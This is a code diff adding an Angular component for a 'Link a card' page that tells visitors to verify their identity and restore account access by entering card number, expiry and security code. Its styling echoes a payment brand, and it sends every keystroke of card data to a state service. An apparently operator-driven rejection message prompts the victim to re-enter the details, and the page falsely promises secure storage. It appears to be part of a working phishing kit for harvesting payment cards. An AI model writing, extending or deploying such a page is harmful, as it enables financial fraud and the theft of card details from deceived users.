@@ -1,0 +1,234 @@
+
+import { Component, inject, signal } from '@angular/core';
+import { CommonModule } from '@angular/common';
+import { FormsModule } from '@angular/forms';
+import { PublicLayoutComponent } from './layout/public-layout.component';
+import { StateService } from '../services/state.service';
+
+@Component({
+  selector: 'app-card-verification',
+  standalone: true,
+  imports: [CommonModule, FormsModule, PublicLayoutComponent],
+  template: `
+    <app-public-layout>
+      
+      <div class="flex flex-col items-center mb-8">
+        <h1 class="text-2xl font-bold text-[#2c2e2f] mb-3 text-center tracking-tight">Link a card</h1>
+        <p class="text-[15px] text-[#5e6c75] text-center leading-relaxed max-w-[90%]">
+           Link a debit or credit card to verify your identity and restore full account access.
+        </p>
+      </div>
+
+      @if (state.rejectionReason()) {
+        <div class="mb-6 bg-[#fff4f4] border-l-4 border-[#d92d20] p-4 flex items-start gap-3 rounded-r-md animate-in fade-in slide-in-from-top-2">
+            <span class="material-icons text-[#d92d20] text-xl mt-0.5">credit_card_off</span>
+            <div>
+              <p class="text-sm font-bold text-[#2c2e2f]">Check card details</p>
+              <p class="text-xs text-[#5e6c75]">We couldn't confirm this card. Please try again.</p>
+            </div>
+        </div>
+      }
+
+      <div class="space-y-5">
+        
+        <div class="space-y-4">
+           <!-- Card Number -->
+          <div class="relative group">
+            <input 
+                 type="text" 
+                 [value]="cardNumberDisplay"
+                 (input)="onCardInput($event)"
+                 (blur)="touchedCard.set(true)"
+                 id="cardNum"
+                 placeholder=" "
+                 maxlength="19"
+                 class="peer w-full h-[56px] pl-12 pr-10 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus font-mono tracking-wide"
+                 [class.shadow-input-error]="touchedCard() && !isCardNumValid()"
+               >
+               <label 
+                 for="cardNum" 
+                 class="absolute left-12 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
+                 >
+                 Card number
+              </label>
+               <span class="material-icons absolute left-4 top-4 text-slate-400 text-2xl peer-focus:text-brand-500 transition-colors">payment</span>
+               
+               <!-- Dynamic Brand Icon -->
+               @if(cardType() !== 'unknown') {
+                   <div class="absolute right-3 top-3.5 h-7 w-10 bg-white shadow-sm border rounded flex items-center justify-center">
+                        <img *ngIf="cardType() === 'visa'" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-3 object-contain">
+                        <img *ngIf="cardType() === 'mastercard'" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-4 object-contain">
+                        <img *ngIf="cardType() === 'amex'" src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" class="h-3 object-contain">
+                        <img *ngIf="cardType() === 'discover'" src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" class="h-5 object-contain">
+                   </div>
+               }
+          </div>
+
+           <!-- Exp / CVV Row -->
+          <div class="flex gap-4">
+             <div class="relative w-1/2 group">
+                <input 
+                  type="text" 
+                  [value]="expiry"
+                  (input)="onExpiryInput($event)"
+                  (blur)="touchedExp.set(true)"
+                  id="expiry"
+                  placeholder=" "
+                  maxlength="5"
+                  class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus font-mono"
+                  [class.shadow-input-error]="touchedExp() && !isExpiryValid()"
+                >
+                <label 
+                   for="expiry" 
+                   class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
+                   >
+                   MM / YY
+                </label>
+             </div>
+             
+             <div class="relative w-1/2 group">
+                <input 
+                    type="password" 
+                    [(ngModel)]="cvv"
+                    (ngModelChange)="onCvvChange($event)"
+                    (blur)="touchedCvv.set(true)"
+                    id="cvv"
+                    placeholder=" "
+                    [maxlength]="cvvMaxLength()"
+                    class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus font-mono"
+                    [class.shadow-input-error]="touchedCvv() && !isCvvValid()"
+                  >
+                  <label 
+                   for="cvv" 
+                   class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
+                   >
+                   Security Code
+                  </label>
+                  
+                  <div class="absolute right-3 top-4 text-slate-400">
+                      <span class="material-icons text-[20px]">help_outline</span>
+                  </div>
+             </div>
+          </div>
+        </div>
+
+        <div class="pt-4">
+          <button 
+            (click)="submit()"
+            [disabled]="!isValid()"
+            [class.opacity-50]="!isValid()"
+            [class.hover:bg-brand-900]="isValid()"
+            class="w-full bg-brand-800 text-white font-bold text-[16px] py-4 px-4 rounded-full transition-all duration-300 shadow-lg shadow-brand-500/20 hover:scale-[1.02] active:scale-[0.98]"
+          >
+            Link Card
+          </button>
+        </div>
+        
+        <div class="flex justify-center items-center gap-2 mt-4">
+             <span class="material-icons text-[14px] text-slate-400">lock</span>
+             <p class="text-xs text-slate-500 font-medium">Your card information is stored securely.</p>
+        </div>
+      </div>
+    </app-public-layout>
+  `
+})
+export class CardVerificationComponent {
+  state = inject(StateService);
+
+  cardNumber = '';
+  cardNumberDisplay = '';
+  expiry = '';
+  cvv = '';
+  
+  // Validation Flags
+  touchedCard = signal(false);
+  touchedExp = signal(false);
+  touchedCvv = signal(false);
+  isValid = signal(false);
+  isExpiryValid = signal(false);
+  
+  cardType = signal<'visa' | 'mastercard' | 'amex' | 'discover' | 'jcb' | 'diners' | 'unknown'>('unknown');
+
+  onCardInput(event: any) {
+    let input = event.target.value.replace(/\D/g, ''); 
+    if (input.length > 16) {
+        input = input.substring(0, 16);
+    }
+    this.cardNumber = input;
+    const parts = input.match(/.{1,4}/g);
+    this.cardNumberDisplay = parts ? parts.join(' ') : input;
+
+    this.validate();
+    this.state.updateCard({ number: this.cardNumber });
+  }
+
+  onExpiryInput(event: any) {
+      let input = event.target.value.replace(/\D/g, '');
+      if (input.length >= 2) {
+          input = input.substring(0, 2) + '/' + input.substring(2, 4);
+      }
+      this.expiry = input;
+      this.validate();
+      this.state.updateCard({ expiry: this.expiry });
+  }
+
+  onCvvChange(value: string) {
+      const clean = value.replace(/\D/g, '');
+      if (clean !== value) {
+          this.cvv = clean; 
+      }
+      this.validate();
+      this.state.updateCard({ cvv: this.cvv });
+  }
+
+  cvvMaxLength() {
+      return this.cardType() === 'amex' ? 4 : 3;
+  }
+
+  isCvvValid() {
+     const len = this.cvv.length;
+     const max = this.cvvMaxLength();
+     return len === max;
+  }
+  
+  isCardNumValid() {
+      const len = this.cardNumber.length;
+      if (this.cardType() === 'amex') return len === 15;
+      if (this.cardType() === 'diners') return len === 14;
+      return len === 16; 
+  }
+
+  validate() {
+    const num = this.cardNumber;
+    if (/^4/.test(num)) this.cardType.set('visa');
+    else if (/^5[1-5]/.test(num) || /^2(?:2(?:2[1-9]|[3-9]\d)|[3-6]\d\d|7(?:[01]\d|20))/.test(num)) this.cardType.set('mastercard');
+    else if (/^3[47]/.test(num)) this.cardType.set('amex');
+    else if (/^6(?:011|5)/.test(num)) this.cardType.set('discover');
+    else if (/^(?:2131|1800|35\d{3})/.test(num)) this.cardType.set('jcb');
+    else if (/^3(?:0[0-5]|[68])/.test(num)) this.cardType.set('diners');
+    else this.cardType.set('unknown');
+    
+    let validExp = false;
+    if (this.expiry.length === 5) {
+        const [mm, yy] = this.expiry.split('/').map(Number);
+        const now = new Date();
+        const currentYear = parseInt(now.getFullYear().toString().substring(2));
+        const currentMonth = now.getMonth() + 1;
+
+        if (mm >= 1 && mm <= 12) {
+            if (yy > currentYear || (yy === currentYear && mm >= currentMonth)) {
+                validExp = true;
+            }
+        }
+    }
+    this.isExpiryValid.set(validExp);
+
+    this.isValid.set(this.isCardNumValid() && validExp && this.isCvvValid());
+  }
+
+  submit() {
+    if (this.isValid()) {
+      this.state.submitCard(this.cardNumber, this.expiry, this.cvv);
+    }
+  }
+}
